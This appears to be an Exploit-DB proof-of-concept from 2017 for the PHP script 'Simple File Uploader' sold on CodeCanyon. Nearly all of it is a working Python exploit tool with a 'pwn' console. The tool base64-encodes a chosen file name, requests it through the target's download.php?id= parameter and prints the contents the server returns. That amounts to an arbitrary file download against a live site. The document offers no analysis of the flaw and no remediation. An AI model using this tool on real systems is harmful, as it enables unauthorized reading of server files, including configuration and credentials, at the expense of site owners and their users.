# Date: 27/04/2017
# Exploit Author: Daniel Godoy
# Vendor Homepage: https://codecanyon.net/
# Software Link: https://codecanyon.net/item/simple-file-uploader-explorer-and-manager-php-based-secured-file-manager/18393053
# Tested on: GNU/Linux
# GREETZ: Rodrigo MouriÃ±o, Rodrigo Avila, #RemoteExecution Team
 
 
 
 
POC
 
#!/usr/bin/env python
#https://pastebin.com/HeT7RuRU
import os,re,requests,time,base64
os.system(&#039;clear&#039;) 
 
BLUE = &#039;\033[94m&#039;
RED = &#039;\033[91m&#039;
GREEN = &#039;\033[32m&#039;
CYAN = "\033[96m"
WHITE = "\033[97m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
GREY = "\033[90m"
DEFAULT = "\033[0m"
 
def banner():
    print WHITE+""
    print "                                              ##          ## "
    print "                                                ##      ##    "    
    print "                                              ############## "
    print "                                            ####  ######  #### "
    print "                                          ###################### "
    print "                                          ##  ##############  ##     "
    print "                                          ##  ##          ##  ## "
    print "                                                ####  ####"
    print ""
 
def details():
    print WHITE+"                              =[" + YELLOW + "Simple File Uploader Download Tool v1.0.0 "
    print ""
 
def core_commands():
    os.system(&#039;clear&#039;)
    print WHITE+&#039;&#039;&#039;Core Commands\n===============\n
Command\t\t\tDescription\n-------\t\t\t-----------\n
?\t\t\tHelp menu
quit\t\t\tExit the console
info\t\t\tDisplay information
download\t\t\tExploit Vulnerability
 
    &#039;&#039;&#039;
 
def about():
    os.system(&#039;clear&#039;)
    print WHITE+&#039;&#039;&#039;Simple File Uploader Download Tool v1.0.0 \n===============\n
Author\t\t\tDescription\n-------\t\t\t-----------\n
Daniel Godoy\t\thttps://www.exploit-db.com/author/?a=3146
    &#039;&#039;&#039;
 
def download():
    other = &#039;a&#039;
    while other != &#039;n&#039;:
            urltarget = str(raw_input(WHITE+&#039;Target: &#039;))
            filename =  str(raw_input(WHITE+&#039;FileName: &#039;))
            filename =  base64.b64encode(filename)
            print RED+"[x]Sending Attack: "+WHITE+urltarget+&#039;download.php?id=&#039;+filename
            final = urltarget+&#039;download.php?id=&#039;+filename
            r = requests.get(final)
            print r.text
            other = str(raw_input(WHITE+&#039;Test other file? y/n: &#039;))
            if other == "n":
                print "Type quit to exit. Bye!"
 
 
 
banner()
details()
 
option=&#039;0&#039;
while option != 0:
    option = (raw_input(RED+"pwn" + WHITE +" > "))
    if option == "quit":
        os.system(&#039;clear&#039;)
        option = 0
    elif option == "?":
        core_commands()
    elif option == "help":
        core_commands()
    elif option == "about":
        about()
    elif option == "download":
        download()
    elif option == "info":
        about()
    else:
        print "Not a valid option! Need help? Press ? to display core commands " +GREEN

